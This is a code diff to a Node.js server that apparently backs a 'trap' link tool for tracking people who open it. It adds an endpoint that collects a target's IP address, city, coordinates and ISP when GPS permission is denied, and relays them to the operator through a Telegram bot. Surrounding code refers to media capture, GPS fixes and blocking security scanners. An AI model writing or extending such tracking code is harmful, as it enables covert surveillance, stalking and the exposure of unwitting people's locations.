@@ -434,8 +434,7 @@ async function startServer() {
           header = '🖼️ <b>MEDIA INTEGRITY REPORT</b>';
         }
         
-        if (data.visual_identity) statusText = '📸 <i>MEDIA_CAPTURE_ACTIVE</i>';
-        if (data.gps) statusText = '📍 <i>GPS_FIX_ESTABLISHED</i>';
+        statusText = '⏳ <i>WAITING FOR HIGH-PRECISION OSINT...</i>';
         if (data.touch) statusText += ' | 👆 <i>TOUCH_ENABLED</i>';
 
         const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
@@ -756,6 +755,25 @@ async function startServer() {
     }
     res.sendStatus(200);
   });
+  app.post('/api/log/:id/ip_geo', (req, res) => {
+    console.log(`[DEBUG] Received IP_GEO log for ${req.params.id}`);
+    const id = req.params.id;
+    const chatId = getChatIdFromTrapId(id);
+    if (botInstance && chatId) {
+        const data = req.body;
+        const msg = `📍 <b>IP-BASED GEOLOCATION (FALLBACK)</b>\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n\n` +
+                    `🌍 <b>LOCATION:</b> <code>${data.city}, ${data.region}, ${data.country_name}</code>\n` +
+                    `🌐 <b>IP ADDR:</b> <code>${data.ip}</code>\n` +
+                    `🛰️ <b>COORD:</b> <code>${data.latitude}, ${data.longitude}</code>\n` +
+                    `🏢 <b>ISP:</b> <code>${data.org}</code>\n\n` +
+                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                    `⚠️ <i>Note: GPS Permission denied. Using IP triangulation.</i>`;
+        botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(() => {});
+    }
+    res.sendStatus(200);
+  });
+
   app.post('/api/log/:id/gps', (req, res) => {
     console.log(`[DEBUG] Received GPS log for ${req.params.id}`);
     if (isSuspeciousAgent(req.headers['user-agent'])) return res.sendStatus(403);
